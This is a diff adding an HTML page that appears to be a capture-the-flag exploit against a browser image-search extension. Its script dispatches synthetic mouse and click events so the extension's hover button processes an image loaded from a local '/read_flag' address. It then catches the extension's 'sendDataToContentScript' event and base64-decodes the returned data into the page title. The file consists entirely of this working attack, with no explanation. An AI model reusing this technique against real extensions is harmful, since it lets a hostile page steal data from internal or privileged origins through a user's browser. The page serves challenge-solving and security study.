@@ -1,0 +1,51 @@
+<html>
+    <script>
+        window.addEventListener("sendDataToContentScript", (e) => {
+            console.log(e.detail.message);
+            const base64Part = e.detail.message.split(",")[1];
+            const decodedString = atob(base64Part);
+            document.title = decodedString;
+        });
+
+        function touch(e) {
+            const rect = e.getBoundingClientRect();
+            const mouseMoveEvent = new MouseEvent("mousemove", {
+                view: window,
+                bubbles: true,
+                cancelable: false,
+                clientX: rect.left + rect.width / 2,
+                clientY: rect.top + rect.height / 2,
+            });
+            const mouseOverEvent = new MouseEvent("mouseover", {
+                view: window,
+                bubbles: true,
+                cancelable: false,
+                clientX: rect.left + rect.width / 2,
+                clientY: rect.top + rect.height / 2,
+            });
+            e.dispatchEvent(mouseOverEvent);
+            e.dispatchEvent(mouseMoveEvent);
+        }
+
+        setTimeout(() => {
+            touch(document.querySelector("#chrome_pc_imgSearch_hoverWrapper > div > div"));
+            touch(document.querySelector("body > div:nth-child(1) > img"));
+            const clickEvent = new MouseEvent("click", {
+                view: window,
+                bubbles: true,
+                cancelable: false,
+            });
+            document.querySelector("#chrome_pc_imgSearch_hoverWrapper > div > div").dispatchEvent(clickEvent);
+        }, 1500);
+
+    </script>
+
+    <body>
+        <div>
+            <img
+                style="width: 400px; height: 400px"
+                src="http://127.0.1.14:1919/read_flag"
+            />
+        </div>
+    </body>
+</html>
